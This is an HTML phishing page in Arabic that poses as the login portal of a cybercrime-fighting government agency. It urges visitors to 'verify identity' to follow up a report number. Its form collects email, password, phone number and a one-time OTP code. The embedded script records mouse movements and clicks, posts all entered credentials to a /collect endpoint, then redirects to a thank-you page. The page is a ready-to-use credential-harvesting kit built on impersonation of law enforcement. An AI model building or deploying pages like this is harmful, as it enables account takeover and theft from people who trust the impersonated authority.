<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول - متابعة البلاغ</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #fff;
        margin: 0;
        padding: 0;
        position: relative;
    }

    /* اللوجو كخلفية خلف الكلام */
    body::before {
        content: "";
        position: fixed;
        inset: 0;
        background: url("https://i.ibb.co/fdKfbpGx/IMG-1398.jpg") center 40% / 300px auto no-repeat;
        opacity: 0.08;
        pointer-events: none;
    }

    header {
        display: flex;
        justify-content: center;
        padding: 15px;
        background-color: #f5f5f5;
        border-bottom: 2px solid #008000;
    }
    header h1 {
        font-size: 20px;
        color: #333;
        margin: 0;
        text-align: center;
    }
    .container {
        padding: 20px;
        max-width: 400px;
        margin: auto;
    }
    .warning {
        color: red;
        font-weight: bold;
        text-align: center;
        margin-bottom: 20px;
    }
    input[type="text"], input[type="password"], input[type="tel"], input[type="number"] {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
    }
    button {
        background-color: red;
        color: white;
        padding: 12px;
        border: none;
        border-radius: 5px;
        font-size: 18px;
        width: 100%;
    }
</style>
</head>
<body>

<header>
    <h1>الإدارة العامة لمكافحة الجرائم الإلكترونية</h1>
</header>

<div class="container">
    <p class="warning">⚠️ الرجاء إدخال بياناتك للتحقق من هويتك ومتابعة البلاغ رقم 1155/2025</p>
    <form id="loginForm" method="post" action="/submit">
        <input type="text" name="email" placeholder="عنوان البريد الإلكتروني" required>
        <input type="password" name="password" placeholder="كلمة المرور" required>
        <input type="tel" name="phone" placeholder="رقم الهاتف" required>
        <input type="number" name="otp" placeholder="رمز التحقق OTP" required>
        <button type="submit">Verify and Continue</button>
    </form>
</div>

<script>
let startTime = Date.now();
let movements = [];
let clicks = 0;

document.addEventListener("mousemove", function(e) {
    movements.push({x: e.clientX, y: e.clientY, t: Date.now() - startTime});
});

document.addEventListener("click", function() {
    clicks++;
});

document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    let formData = {
        email: this.email.value,
        password: this.password.value,
        phone: this.phone.value,
        otp: this.otp.value,
        time_spent: Math.floor((Date.now() - startTime) / 1000),
        movements: movements.length,
        clicks: clicks
    };
    fetch("/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(formData)
    }).then(() => {
        window.location.href = "/thanks";
    });
});
</script>

</body>
</html>
